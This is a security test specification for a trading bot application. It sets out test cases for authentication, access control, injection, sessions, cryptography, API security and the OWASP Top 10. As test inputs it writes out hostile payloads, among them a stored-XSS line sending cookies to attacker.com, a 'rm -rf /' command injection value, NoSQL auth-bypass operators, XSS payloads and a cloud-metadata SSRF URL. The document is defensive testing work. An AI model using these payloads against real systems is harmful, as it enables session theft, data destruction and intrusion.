# Security Test Specification

**Document ID:** SEC-SPEC-001
**Version:** 1.0
**Last Updated:** 2025-10-11
**Status:** Active

---

## Table of Contents

1. [Security Testing Strategy](#security-testing-strategy)
2. [Authentication & Authorization Testing](#authentication--authorization-testing)
3. [Input Validation & Injection Testing](#input-validation--injection-testing)
4. [Session Management Testing](#session-management-testing)
5. [Cryptography Testing](#cryptography-testing)
6. [API Security Testing](#api-security-testing)
7. [OWASP Top 10 Testing](#owasp-top-10-testing)
8. [Penetration Testing](#penetration-testing)
9. [Security Tools](#security-tools)

---

## Security Testing Strategy

### Objectives

1. **Identify Vulnerabilities**: Find security flaws before attackers do
2. **Verify Controls**: Ensure security mechanisms work as designed
3. **Validate Compliance**: Meet security standards and regulations
4. **Assess Risk**: Understand and prioritize security risks

### Testing Scope

**In Scope:**
- Authentication mechanisms (JWT, password hashing)
- Authorization and access control
- Input validation and sanitization
- Cryptographic implementations
- API security
- Session management
- Data protection
- Error handling and information disclosure

**Out of Scope:**
- Physical security
- Social engineering
- Infrastructure security (handled separately)

### Testing Approach

```
Manual Testing (40%) + Automated Scanning (40%) + Penetration Testing (20%)
```

---

## Authentication & Authorization Testing

### SEC-001: Password Security Testing

**Test Cases:**

#### SEC-001-01: Password Storage
```gherkin
Given a user registers with password "SecurePass123!"
When password is stored in database
Then password should be hashed with bcrypt
And hash should have cost factor >= 10
And plaintext password should not exist anywhere
And hash should be different each time (random salt)
```

**Test Procedure:**
1. Register user with test password
2. Query database directly
3. Verify password field contains bcrypt hash (starts with `$2`)
4. Attempt to reverse hash (should be infeasible)
5. Verify salt is unique

**Tools:** Database inspection, manual verification

---

#### SEC-001-02: Password Strength Requirements
```gherkin
Scenario Outline: Password strength validation
  When user attempts registration with password "<password>"
  Then validation should <result>

  Examples:
    | password         | result                              |
    | "123"            | Fail (too short)                    |
    | "password"       | Fail (no uppercase, number, special)|
    | "Password"       | Fail (no number, special)           |
    | "Password123"    | Fail (no special character)         |
    | "Password123!"   | Pass                                |
```

**Automated Test:** Unit tests in `/Users/dungngo97/Documents/bot-core/rust-core-engine/tests/test_auth.rs`

---

#### SEC-001-03: Brute Force Protection
```gherkin
Given user "test@example.com" exists
When I attempt login with wrong password 5 times
Then account should be temporarily locked
And further login attempts should fail with "Account locked"
And lock should expire after 15 minutes
```

**Test Procedure:**
1. Create test account
2. Script 10 failed login attempts
3. Verify 6th attempt returns "Account locked"
4. Wait 15 minutes
5. Verify account is unlocked

**Expected Behavior:**
- Max 5 failed attempts per 15 minutes
- Exponential backoff on retries
- CAPTCHA after 3 failed attempts (optional)

---

### SEC-002: JWT Token Security Testing

#### SEC-002-01: Token Signature Validation
```gherkin
Given valid JWT token signed with secret "key_A"
When I modify token signature
Or use different secret "key_B" to verify
Then verification should fail
And access should be denied with 401 Unauthorized
```

**Test Procedure:**
1. Generate valid JWT token
2. Modify signature portion of token
3. Attempt API request with modified token
4. Verify rejection

**Tool:** JWT debugger (jwt.io), Burp Suite

---

#### SEC-002-02: Token Expiration
```gherkin
Given JWT token with 24-hour expiration
When 24 hours + 1 second passes
Then token should be expired
And API requests should return 401 "Token expired"
And user should be redirected to login
```

---

#### SEC-002-03: Token Claims Manipulation
```gherkin
Given regular user token with claim: is_admin=false
When I modify token to set is_admin=true
Then signature should be invalid
And token verification should fail
And admin access should be denied
```

**Test:** Modify JWT claims and verify signature invalidation

---

### SEC-003: Authorization Testing

#### SEC-003-01: Horizontal Privilege Escalation
```gherkin
Given User A with user_id="user_123"
And User B with user_id="user_456"
When User A attempts to access User B's trades
GET /api/trades?user_id=user_456
Then request should be denied
And error: "Unauthorized: Cannot access other user's data"
```

**Test Procedure:**
1. Create two user accounts
2. Authenticate as User A
3. Attempt to access User B's resources
4. Verify access denied

---

#### SEC-003-02: Vertical Privilege Escalation
```gherkin
Given regular user (is_admin=false)
When user attempts admin-only operation
POST /api/admin/users
Then request should be denied with 403 Forbidden
And error: "Admin privileges required"
```

**Test:** Attempt admin operations with regular user token

---

#### SEC-003-03: Direct Object Reference
```gherkin
Given trade with ID "trade_12345" belongs to User A
When User B attempts:
GET /api/trades/trade_12345
Then access should be denied
Unless trade_12345 belongs to User B
```

**Test:** IDOR (Insecure Direct Object Reference) testing

---

## Input Validation & Injection Testing

### SEC-004: SQL/NoSQL Injection Testing

#### SEC-004-01: MongoDB Injection in Authentication
```gherkin
Given login endpoint: POST /api/auth/login
When I submit malicious payload:
{
  "email": {"$ne": null},
  "password": {"$ne": null}
}
Then server should reject malformed input
And return 400 Bad Request
And authentication should fail
And no user should be logged in
```

**Test Payloads:**
```json
// Attempt to bypass authentication
{"email": {"$ne": null}, "password": {"$ne": null}}

// Attempt to extract data
{"email": {"$regex": ".*"}, "password": "anything"}

// Attempt operator injection
{"email": "admin@example.com", "password": {"$gt": ""}}
```

**Expected:** All malicious payloads rejected

---

#### SEC-004-02: NoSQL Injection in Query Parameters
```gherkin
When I request trades with malicious filter:
GET /api/trades?symbol[$ne]=BTCUSDT
Then server should sanitize input
And only literal string comparison should occur
And MongoDB operator should not be executed
```

**Test:** Inject MongoDB operators via query params

---

### SEC-005: XSS (Cross-Site Scripting) Testing

#### SEC-005-01: Reflected XSS
```gherkin
When I submit username: "<script>alert('XSS')</script>"
And username is displayed on profile page
Then script should be escaped
And rendered as text: &lt;script&gt;alert('XSS')&lt;/script&gt;
And no JavaScript should execute
```

**Test Payloads:**
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
javascript:alert('XSS')
<iframe src="javascript:alert('XSS')">
```

**Test Locations:**
- Username field
- Trade notes/comments
- Error messages
- Search queries

---

#### SEC-005-02: Stored XSS
```gherkin
Given I save trade note: "<img src=x onerror=fetch('http://attacker.com/steal?cookie='+document.cookie)>"
When another user views my trade
Then script should not execute
And image should be sanitized
```

**Critical:** Stored XSS is more dangerous than reflected

---

### SEC-006: Command Injection Testing

```gherkin
When I submit symbol parameter: "BTCUSDT; rm -rf /"
Then server should validate symbol format
And reject invalid characters
And no shell command should execute
```

**Test:** Special characters in all input fields

---

### SEC-007: LDAP/XML Injection Testing

```gherkin
When I submit email: "admin@example.com)(|(password=*))"
Or JSON: "{'user': '<![CDATA[<script>alert('XSS')</script>]]>'}"
Then server should sanitize input
And prevent injection attacks
```

---

## Session Management Testing

### SEC-008: Session Fixation

```gherkin
Given attacker obtains valid session token
When victim logs in with that token
Then new session should be created
And old token should be invalidated
```

**Test:** Attempt to reuse pre-login session after authentication

---

### SEC-009: Session Timeout

```gherkin
Given user logs in at 10:00 AM
And session timeout is 24 hours
When user is idle until 10:01 AM next day
Then session should be expired
And user should be logged out
And new login should be required
```

---

### SEC-010: Concurrent Session Management

```gherkin
Given user logs in on Device A
And logs in on Device B
When user logs out on Device A
Then session on Device A should end
But session on Device B should remain active
```

---

## Cryptography Testing

### SEC-011: Encryption at Rest

```gherkin
Given sensitive data (API keys, passwords)
When data is stored in database
Then data should be encrypted
And encryption algorithm should be AES-256 or better
And encryption keys should be stored separately (e.g., KMS)
```

**Test:** Inspect database and verify encryption

---

### SEC-012: Encryption in Transit

```gherkin
When data is transmitted between services
Then TLS 1.2 or higher should be used
And weak ciphers should be disabled
And certificate should be valid
```

**Test:** Network traffic analysis with Wireshark

---

### SEC-013: Secure Random Number Generation

```gherkin
When generating tokens, salts, or nonces
Then cryptographically secure RNG should be used
And not Math.random() or similar weak generators
```

**Test:** Review code for RNG usage

---

## API Security Testing

### SEC-014: API Rate Limiting

```gherkin
Given API rate limit is 100 requests/minute
When I make 101 requests in 1 minute
Then request #101 should return 429 Too Many Requests
And Retry-After header should indicate wait time
```

**Test Script:**
```bash
for i in {1..101}; do
  curl -X POST http://localhost:8080/api/auth/login
done
```

---

### SEC-015: API Authentication

```gherkin
When I access protected endpoint without token
GET /api/account
Then response should be 401 Unauthorized
And error: "Authentication required"
```

**Test:** Attempt all API endpoints without authentication

---

### SEC-016: CORS Configuration

```gherkin
Given frontend is on http://localhost:3000
When frontend makes CORS request
Then server should allow origin: http://localhost:3000
But reject origin: http://evil.com
```

**Test:** Modify Origin header and verify rejection

---

### SEC-017: Content Security Policy

```gherkin
When frontend loads
Then CSP header should be present
And restrict script sources to trusted domains
And prevent inline scripts (unless nonce-based)
```

**Expected Headers:**
```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; style-src 'self' 'unsafe-inline'
```

---

## OWASP Top 10 Testing

### SEC-018: A01:2021 – Broken Access Control

**Tests:**
- [x] Horizontal privilege escalation (SEC-003-01)
- [x] Vertical privilege escalation (SEC-003-02)
- [x] IDOR (SEC-003-03)
- [ ] Bypassing access control checks
- [ ] Force browsing to admin pages

---

### SEC-019: A02:2021 – Cryptographic Failures

**Tests:**
- [x] Password hashing (SEC-001-01)
- [x] Encryption at rest (SEC-011)
- [x] Encryption in transit (SEC-012)
- [ ] Weak encryption algorithms
- [ ] Hard-coded secrets

---

### SEC-020: A03:2021 – Injection

**Tests:**
- [x] SQL/NoSQL injection (SEC-004)
- [x] XSS (SEC-005)
- [x] Command injection (SEC-006)
- [ ] LDAP injection
- [ ] OS command injection

---

### SEC-021: A04:2021 – Insecure Design

**Tests:**
- [ ] Business logic flaws
- [ ] Missing rate limiting
- [ ] Insufficient anti-automation
- [ ] Lack of segregation of duties

---

### SEC-022: A05:2021 – Security Misconfiguration

**Tests:**
- [ ] Default credentials
- [ ] Unnecessary features enabled
- [ ] Detailed error messages (information disclosure)
- [ ] Missing security headers
- [ ] Outdated software components

**Test:**
```bash
# Check for verbose error messages
curl http://localhost:8080/api/nonexistent

# Should return generic 404, not stack trace
```

---

### SEC-023: A06:2021 – Vulnerable Components

**Tests:**
- [ ] Outdated dependencies
- [ ] Known CVEs in libraries
- [ ] Unmaintained packages

**Tools:**
```bash
# Rust
cargo audit

# Python
safety check

# Node.js
npm audit
```

---

### SEC-024: A07:2021 – Identification & Authentication Failures

**Tests:**
- [x] Weak password policy (SEC-001-02)
- [x] Brute force protection (SEC-001-03)
- [x] Session management (SEC-008, SEC-009)
- [ ] Credential stuffing protection
- [ ] Multi-factor authentication

---

### SEC-025: A08:2021 – Software & Data Integrity Failures

**Tests:**
- [ ] Unsigned code/artifacts
- [ ] Insecure CI/CD pipeline
- [ ] Unverified updates
- [ ] Insecure deserialization

---

### SEC-026: A09:2021 – Security Logging & Monitoring Failures

**Tests:**
- [ ] Failed login attempts logged
- [ ] Unauthorized access attempts logged
- [ ] High-value transactions logged
- [ ] Log tampering prevention
- [ ] Alerting on suspicious activity

**Test:**
```bash
# Attempt failed login
curl -X POST http://localhost:8080/api/auth/login \
  -d '{"email":"test@test.com","password":"wrong"}'

# Verify logged in application logs
grep "Failed login attempt" /var/log/bot-core/rust-core.log
```

---

### SEC-027: A10:2021 – Server-Side Request Forgery (SSRF)

**Tests:**
- [ ] Internal IP access via user input
- [ ] Cloud metadata endpoint access
- [ ] Port scanning via SSRF

**Test:**
```gherkin
When I submit URL parameter: "http://169.254.169.254/latest/meta-data/"
Then server should block internal IP ranges
And not fetch metadata
```

---

## Penetration Testing

### SEC-028: External Penetration Test

**Scope:**
- All publicly accessible endpoints
- Frontend application
- API endpoints
- WebSocket connections

**Methodology:**
1. **Reconnaissance**: Map attack surface
2. **Scanning**: Identify vulnerabilities
3. **Exploitation**: Attempt to exploit findings
4. **Post-Exploitation**: Assess impact
5. **Reporting**: Document findings and recommendations

**Timeline:**
- Frequency: Quarterly
- Duration: 2 weeks
- Black box approach (no insider knowledge)

---

### SEC-029: Internal Security Audit

**Scope:**
- Source code review
- Configuration review
- Database security
- Secrets management

**Checklist:**
- [ ] No hard-coded credentials
- [ ] Environment variables used for secrets
- [ ] Database backups encrypted
- [ ] Least privilege principle applied
- [ ] Security headers configured
- [ ] Input validation on all endpoints
- [ ] Output encoding implemented
- [ ] Error handling doesn't leak sensitive info

---

### SEC-030: Bug Bounty Program

**Rewards:**
| Severity | Example | Reward |
|----------|---------|--------|
| Critical | RCE, SQL injection, authentication bypass | $500-$2000 |
| High | XSS, CSRF, privilege escalation | $200-$500 |
| Medium | Information disclosure, DoS | $50-$200 |
| Low | Security misconfiguration | $25-$50 |

**Out of Scope:**
- Testnet/development environments
- Rate limiting bypass
- Social engineering
- Physical attacks

---

## Security Tools

### Automated Scanning Tools

#### OWASP ZAP (Zed Attack Proxy)
```bash
# Install
docker pull owasp/zap2docker-stable

# Run automated scan
docker run -t owasp/zap2docker-stable zap-baseline.py \
  -t http://localhost:3000

# Generate report
docker run -v $(pwd):/zap/wrk:rw -t owasp/zap2docker-stable \
  zap-full-scan.py -t http://localhost:3000 -r report.html
```

**Use Cases:**
- Automated vulnerability scanning
- Spider and scan web application
- Intercept and modify requests
- Fuzz testing

---

#### Burp Suite
- **Features**: Proxy, scanner, intruder, repeater
- **Use Cases**: Manual penetration testing
- **License**: Free (Community) / Paid (Professional)

---

#### SQLMap
```bash
# Install
pip install sqlmap

# Test for SQL injection
sqlmap -u "http://localhost:8080/api/search?q=test" \
  --batch --risk=3 --level=5
```

---

#### Nikto
```bash
# Web server scanner
nikto -h http://localhost:8080
```

---

### Dependency Scanning

#### Rust: cargo-audit
```bash
cargo install cargo-audit
cargo audit
```

#### Python: Safety
```bash
pip install safety
safety check
```

#### Node.js: npm audit
```bash
npm audit
npm audit fix
```

---

### Secret Scanning

#### Gitleaks
```bash
# Install
brew install gitleaks

# Scan repository
gitleaks detect --source . --verbose

# Scan in CI/CD
gitleaks protect --staged --verbose
```

**Detects:**
- API keys
- Passwords
- Private keys
- Tokens

---

### Static Analysis Security Testing (SAST)

#### SonarQube
- Code quality and security analysis
- Detects vulnerabilities, code smells, bugs
- Integrates with CI/CD

---

## Security Testing Checklist

### Pre-Release Security Review

- [ ] All OWASP Top 10 vulnerabilities tested
- [ ] Automated security scans passed (ZAP, cargo audit, npm audit)
- [ ] No hard-coded secrets in code
- [ ] All API endpoints require authentication
- [ ] Input validation on all user inputs
- [ ] Output encoding prevents XSS
- [ ] CSRF protection enabled
- [ ] Security headers configured
- [ ] TLS/HTTPS enforced
- [ ] Rate limiting implemented
- [ ] Error messages don't leak sensitive info
- [ ] Logging and monitoring in place
- [ ] Penetration test conducted
- [ ] Security audit completed
- [ ] Bug bounty program notified

---

## Acceptance Criteria

Security testing is complete when:

- [ ] All critical vulnerabilities fixed
- [ ] High severity issues addressed or accepted risk
- [ ] OWASP Top 10 compliance verified
- [ ] Automated security scans integrated in CI/CD
- [ ] Penetration test report reviewed
- [ ] Security audit findings addressed
- [ ] Security training completed for team
- [ ] Incident response plan in place

---

## Compliance & Standards

### Standards to Follow

- **OWASP ASVS** (Application Security Verification Standard)
- **NIST Cybersecurity Framework**
- **PCI DSS** (if handling payments)
- **GDPR** (if handling EU user data)

### Security Certifications (Future)

- SOC 2 Type II
- ISO 27001

---

**Document Control:**
- **Created by**: Security Team
- **Reviewed by**: Penetration Testing Team
- **Approved by**: CISO / Product Owner
- **Next Review Date**: 2025-11-11

---

*End of Security Test Specification Document*
